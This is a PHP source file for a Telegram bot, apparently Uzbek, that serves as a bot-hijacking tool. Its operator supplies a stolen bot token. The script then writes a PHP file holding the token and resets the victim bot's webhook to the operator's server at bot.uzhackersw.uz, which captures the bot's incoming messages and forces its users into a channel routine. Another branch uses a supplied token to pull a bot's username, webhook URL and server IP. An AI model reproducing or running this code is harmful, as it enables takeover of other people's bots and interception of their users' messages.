<?php
define('TOKEN', "<BOT_TOKEN>");
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
require 'yadro.php';
$data = file_get_contents('php://input');
$data = json_decode($data, true);

$menu = [['Boshladik'], ['/hackingstart']];

$text = $data['message']['text'];
$chat_id = $data['message']['chat']['id'];
$reply = $data["message"]["reply_to_message"]["text"];

function buildKeyBoard(array $options, $onetime = false, $resize = true, $selective = true) {
    $replyMarkup = ['keyboard' => $options, 'one_time_keyboard' => $onetime, 'resize_keyboard' => $resize, 'selective' => $selective, ];
    $encodedMarkup = json_encode($replyMarkup, true);
    return $encodedMarkup;
}

function buildForceReply($selective = true) {
    $replyMarkup = ['force_reply' => true, 'selective' => $selective, ];
    $encodedMarkup = json_encode($replyMarkup, true);
    return $encodedMarkup;
}

if ($text == '/maxfiyishlar') {
        $keyfd = buildKeyBoard($menu, $onetime = false, $resize = true);
       sendTelegram('sendMessage',
		array(
			'chat_id' => $chat_id,
			'text' => "Salom boshlaymizmi ?. <code>".$chat_id."</code>",
			'reply_markup' => $keyfd,
		));
	exit();
}
if ($chat_id != '414229140') {
if (!empty($data['message']['text'])) {
    kanalobuna($data['message']['chat']['id']);
}
die;
}
if ($text == "/hackingstart") {
    $keyfd = buildForceReply($selective = true);
    sendTelegram(
		'sendMessage',
		array(
			'chat_id' => $chat_id,
			'reply_markup' => $keyfd,
			'text' => "/hacking",
			'parse_mode' => 'markdown'
		)
	);
	exit();
}

if ($text == "/jami") {
// Returns array of files
$files = scandir(__DIR__);

// Count number of files and store them to variable..
$num_files = count($files);
$ikki = 4;
$ayimiz = $num_files-$ikki;
sendTelegram(
		'sendMessage',
		array(
			'chat_id' => $chat_id,
			'reply_markup' => $keyfd,
			'text' => "Jami fayllar: ".$ayimiz,
			'parse_mode' => 'markdown'
		)
	);
}

if ($text == "Boshladik") {
    $keyfd = buildForceReply($selective = true);
    sendTelegram(
		'sendMessage',
		array(
			'chat_id' => $chat_id,
			'reply_markup' => $keyfd,
			'text' => "*Bot tokenni yuboring*",
			'parse_mode' => 'markdown'
		)
	);
	exit();
}

if ($reply == '/hacking') {
        $keyfd = buildKeyBoard($menu, $onetime = false, $resize = true);
    $time = time();
$fp = fopen($time.".php", 'wb');
fwrite($fp, "<?php
define('TOKEN', '".$text."');

require 'yadro.php';
\$data = file_get_contents('php://input');
\$data = json_decode(\$data, true);
if (empty(\$data['message']['chat']['id'])) {
    exit('kirma o`lasan');
}
if (!empty(\$data['message']['text'])) {
    kanalobuna(\$data['message']['chat']['id']);
}
");
fclose($fp);
        $webhok = file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=https://bot.uzhackersw.uz/bothacking/".$time.".php");
        $getme = json_decode(file_get_contents("https://api.telegram.org/bot" . $text . "/getme"), true);

 sendTelegram(
		'sendMessage',
		array(
			'chat_id' => $chat_id,
			'text' => "Bot hakcing qilindi \nTekshiring: @".$getme['result']['username']."\n \n<code>".$webhok."</code>",
			'parse_mode' => 'html',
			'reply_markup' => $keyfd,
		)
	);
}

if ($reply == 'Bot tokenni yuboring') {
        $keyfd = buildKeyBoard($menu, $onetime = false, $resize = true);
        $getme = json_decode(file_get_contents("https://api.telegram.org/bot" . $text . "/getme"), true);
        $getwebhookinfo = json_decode(file_get_contents("https://api.telegram.org/bot" . $text . "/getwebhookinfo"), true);

    if (!$getme['result']['username']) {
      sendTelegram(
		'sendMessage',
		array(
			'chat_id' => $chat_id,
			'reply_markup' => $keyfd,
			'text' => "<code>".json_encode($getme)."</code>",
			'parse_mode' => 'html',
		)
	);
	die;
    }
    sendTelegram(
		'sendMessage',
		array(
			'chat_id' => $chat_id,
            'reply_markup' => $keyfd,
            'text' => "Bor usernamesi: @".$getme['result']['username']."\nBot Nomi: ".$getme['result']['first_name']."\n\nBot Wbhook manzil: ".$getwebhookinfo['result']['url']."
IP adres: ".$getwebhookinfo['result']['ip_address']."\n\n/hackingstart",
		)
	);
   exit();
}
